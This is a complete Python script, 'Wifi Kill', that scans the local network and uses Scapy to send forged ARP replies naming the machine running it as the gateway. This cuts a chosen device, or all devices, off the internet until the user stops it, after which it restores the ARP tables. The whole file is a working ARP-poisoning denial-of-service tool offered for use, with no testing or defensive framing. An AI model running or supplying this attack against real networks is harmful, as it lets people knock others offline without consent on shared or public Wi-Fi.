#!/usr/bin/env python3
"""
Wifi Kill
Robert Glew (adjusted for Python 3 & modern Scapy)

This script can be used to kick anyone or everyone off your Wi‑Fi network.
It must be run as root (sudo) in order to send the required packets.
"""

import os
import sys
import logging
import time
import ipaddress
import re
import subprocess
from scapy.all import arping, ARP, send, conf, get_if_hwaddr, sr1

# Silence Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0


def ping_sweep(ip_range):
    """Ping all hosts in ``ip_range`` to populate the ARP cache on Windows."""
    network = ipaddress.ip_network(ip_range, strict=False)
    for ip in network.hosts():
        cmd = ["ping", "-n", "1", "-w", "250", str(ip)]
        if os.name != "nt":
            cmd = ["ping", "-c", "1", "-W", "1", str(ip)]
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def parse_arp_cache():
    """Return ``(ip, mac)`` pairs from the local ARP cache."""
    raw = subprocess.check_output(["arp", "-a"])
    try:
        output = raw.decode("cp850")
    except UnicodeDecodeError:
        output = raw.decode("latin1", errors="ignore")

    pairs = []
    for line in output.splitlines():
        match = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})\s+([0-9a-fA-F:-]{17})", line)
        if match:
            ip = match.group(1)
            mac = match.group(2).replace("-", ":").lower()
            pairs.append((ip, mac))
    return pairs


def get_ip_macs(ips, iface, timeout=2):
    """Return a list of ``(ip, mac)`` tuples for devices on the network."""
    if os.name == "nt":
        ping_sweep(ips)
        return parse_arp_cache()
    answers, _ = arping(ips, iface=iface, timeout=timeout, verbose=0)
    return [(r.psrc, r.hwsrc) for _, r in answers]


def poison(victim_ip, victim_mac, gateway_ip, src_mac):
    """Send ARP packet associating ``gateway_ip`` with ``src_mac``."""
    pkt = ARP(op=2, psrc=gateway_ip, hwsrc=src_mac, pdst=victim_ip, hwdst=victim_mac)
    send(pkt, verbose=0)


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """Send ARP packet pairing ``gateway_ip`` with ``gateway_mac``."""
    pkt = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
    send(pkt, verbose=0)


def print_divider():
    print('-' * 40)


def get_network_params():
    """Return interface, scan range and gateway IP using system commands."""
    if os.name == "nt":
        raw = subprocess.check_output("ipconfig", shell=True)
        try:
            out = raw.decode("cp850")
        except UnicodeDecodeError:
            out = raw.decode("latin1", errors="ignore")

        # Interface (Portuguese & English)
        iface = conf.iface
        for pat in [r"Adaptador de Rede sem fio (.+?):",
                    r"Adaptador Ethernet (.+?):",
                    r"Wireless LAN adapter (.+?):",
                    r"Ethernet adapter (.+?):"]:
            m = re.search(pat, out)
            if m:
                iface = m.group(1).strip()
                break

        # IPv4 address
        ip = None
        for pat in [r"IPv4.*?:\s*([\d\.]+)",
                    r"IPv4 Address.*?:\s*([\d\.]+)",
                    r"Endereço IPv4.*?:\s*([\d\.]+)"]:
            m = re.search(pat, out)
            if m:
                ip = m.group(1)
                break
        if not ip:
            sys.exit("Não foi possível extrair o IPv4 do ipconfig")

        # Subnet mask
        mask = None
        for pat in [r"M[áa]scara de sub-rede.*?:\s*([\d\.]+)",
                    r"Subnet Mask.*?:\s*([\d\.]+)"]:
            m = re.search(pat, out)
            if m:
                mask = m.group(1)
                break
        if not mask:
            sys.exit("Não foi possível extrair a máscara de sub-rede do ipconfig")

        # Gateway
        gateway_ip = None
        for pat in [r"Gateway padr[ãa]o.*?:\s*([\d\.]+)",
                    r"Default Gateway.*?:\s*([\d\.]+)"]:
            m = re.search(pat, out)
            if m:
                gateway_ip = m.group(1)
                break
        if not gateway_ip:
            sys.exit("Não foi possível extrair o gateway padrão do ipconfig")

    else:
        out = subprocess.check_output("ip route show default", shell=True, text=True)
        gw_match = re.search(r"default via ([\d\.]+) dev (\w+)", out)
        if not gw_match:
            sys.exit("Não foi possível extrair o gateway padrão do 'ip route'")
        gateway_ip, iface = gw_match.groups()

        out2 = subprocess.check_output(f"ip -4 addr show {iface}", shell=True, text=True)
        m = re.search(r"inet ([\d\.]+)/(\d+)", out2)
        if not m:
            sys.exit(f"Não foi possível extrair o IP da interface {iface}")
        ip, plen = m.groups()
        mask = ipaddress.IPv4Network(f"0.0.0.0/{plen}", strict=False).netmask.exploded

    network = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
    ip_range = str(network)
    conf.iface = iface
    return iface, ip_range, gateway_ip


def get_gateway_mac(iface, gateway_ip):
    """Return the MAC address for ``gateway_ip`` on ``iface``."""
    if os.name == "nt":
        subprocess.run(["ping", "-n", "1", gateway_ip],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for ip, mac in parse_arp_cache():
            if ip == gateway_ip:
                return mac
    else:
        ans = sr1(ARP(op=1, pdst=gateway_ip), iface=iface, timeout=2, verbose=0)
        if ans:
            return ans.hwsrc
    return None


def is_admin():
    """Return True if the script is running with administrative rights."""
    if os.name != "nt":
        return os.geteuid() == 0
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def check_root():
    """Exit if not executed with administrator privileges."""
    if not is_admin():
        sys.exit("Execute como root/sudo (Linux) ou como Administrador (Windows)")


def main():
    check_root()

    refreshing = True
    choice = None
    gateway_mac = None

    while refreshing:
        iface, ip_range, gateway_ip = get_network_params()
        src_mac = get_if_hwaddr(iface)
        gateway_mac = get_gateway_mac(iface, gateway_ip)

        print(f"Using interface {iface} with scan range {ip_range}")
        print_divider()

        devices = get_ip_macs(ip_range, iface, timeout=4)

        print_divider()
        print("Connected devices:")
        for idx, (ip, mac) in enumerate(devices):
            print(f"{idx}) {ip}\t{mac}")
            if ip == gateway_ip:
                gateway_mac = mac
        print_divider()

        print(f"Assumed gateway IP: {gateway_ip}")
        if gateway_mac:
            print(f"Detected gateway MAC: {gateway_mac}")
        else:
            print("⚠️  Gateway MAC not found – cannot restore later!")
        print_divider()

        print("Who do you want to boot?")
        print("(r) Refresh, (a) Kill all, (q) Quit")

        while True:
            cmd = input("> ").strip().lower()
            if cmd == 'r':
                break
            if cmd == 'a':
                choice = 'a'
                refreshing = False
                break
            if cmd == 'q':
                return
            if cmd.isdigit() and 0 <= int(cmd) < len(devices):
                choice = int(cmd)
                refreshing = False
                break
            print("Enter a valid option (r, a, q or device number).")

    try:
        if choice == 'a':
            print("Killing ALL devices... (Ctrl+C to stop)")
            while True:
                for ip, mac in devices:
                    poison(ip, mac, gateway_ip, src_mac)
                time.sleep(2)
        else:
            victim_ip, victim_mac = devices[choice]
            print(f"Preventing {victim_ip} from accessing the internet... (Ctrl+C to stop)")
            while True:
                poison(victim_ip, victim_mac, gateway_ip, src_mac)
                time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        targets = devices if choice == 'a' else [(victim_ip, victim_mac)]
        for ip, mac in targets:
            if gateway_mac:
                restore(ip, mac, gateway_ip, gateway_mac)
        print("Done. You're welcome!")


if __name__ == "__main__":
    main()
